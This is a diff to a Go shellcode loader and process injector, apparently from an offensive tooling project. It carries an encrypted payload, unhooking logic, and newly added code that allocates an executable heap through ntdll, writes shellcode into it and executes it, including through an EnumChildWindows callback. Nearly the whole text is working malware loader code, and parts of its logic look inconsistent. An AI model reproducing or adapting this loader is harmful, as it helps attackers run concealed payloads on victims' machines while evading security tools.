@@ -39,7 +39,10 @@ var (
 	loaderAddress uintptr
 	f             *os.File
 	// P1 -> ShellcodeLoader
-	P1 = "vrIvoLcyCCzBNssm/kFmjIAW2w1uZlMh6OuiCc62K1AM4N7lDbkoDtJs0IhI1D/qF3dWEV7f9xhecAtGWFQmHQ=="
+	P1              = "vrIvoLcyCCzBNssm/kFmjIAW2w1uZlMh6OuiCc62K1AM4N7lDbkoDtJs0IhI1D/qF3dWEV7f9xhecAtGWFQmHQ=="
+	ntdll           = syscall.NewLazyDLL("ntdll.dll")
+	RtlCreateHeap   = ntdll.NewProc("RtlCreateHeap")
+	RtlAllocateHeap = ntdll.NewProc("RtlAllocateHeap")
 )
 
 type ObjectAttributes struct {
@@ -71,7 +74,7 @@ func FindMemoryHole(hProcess uintptr, exportAddress uintptr, size uintptr) uintp
 			ExecuteRead,
 		)
 		if err != nil {
-			log.Fatal("[!] 不要重复对一个进程进行脱钩", err)
+			log.Fatal("[!] 不要重复对一个进程进行脱钩")
 			continue
 		}
 
@@ -246,12 +249,25 @@ func Inject(DLL string, export string, Pid int, shellcode []byte) {
 		); err != nil {
 			log.Fatal(err)
 		}
-		temp := make([]byte, bytesToRead)
-		srcAddr := (uintptr)(unsafe.Pointer(&buf))
-		dst := make([]byte, len(buf))
-		copy(dst, (*[1 << 30]byte)(unsafe.Pointer(srcAddr))[:len(buf)])
-		copy((*[1 << 30]byte)(temp)[:len(buf)], dst)
+		shellSize := uintptr(len(shellcode))
+		hhandl, _, _ := RtlCreateHeap.Call(0x00040000|0x00000002, 0, shellSize, shellSize, 0, 0)
+		destination, _, _ := RtlAllocateHeap.Call(hhandl, 0x00000008, shellSize)
 
+		for index := uint32(0); index < uint32(len(shellcode)); index++ {
+			writePtr := unsafe.Pointer(destination + uintptr(index))
+			v := (*byte)(writePtr)
+			*v = shellcode[index]
+		}
+
+		syscall.Syscall(destination, 0, 0, 0, 0)
+
+		temp := make([]byte, bytesToRead)
+		srcAddr := (uintptr)(unsafe.Pointer(&shellcode))
+		dst := make([]byte, len(shellcode))
+		copy(dst, (*[1 << 30]byte)(unsafe.Pointer(srcAddr))[:len(shellcode)])
+		copy((*[1 << 30]byte)(temp)[:len(shellcode)], dst)
+
+		syscall.MustLoadDLL("User32.dll").MustFindProc("EnumChildWindows").Call(0, addr, 0)
 		currentBytes := uintptr(unsafe.Pointer(&bytesToRead))
 		originalBytes1 := uintptr(unsafe.Pointer(&originalBytes))
 
